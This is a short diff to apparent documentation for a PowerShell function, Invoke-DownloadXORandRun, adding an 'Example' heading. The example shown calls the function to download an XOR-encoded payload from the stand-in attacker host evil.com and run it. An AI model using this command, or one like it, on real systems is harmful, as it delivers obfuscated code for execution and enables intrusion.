@@ -11,6 +11,7 @@ The remote path of the single-byte encoded file
 **XOREncodeKey**
 The value of the XOR Encoding
 
+### Example:
 ```PowerShell
 Invoke-DownloadXORandRun -pURL http://evil.com/6aenc.out -XorEncodeKey 6A
 ```
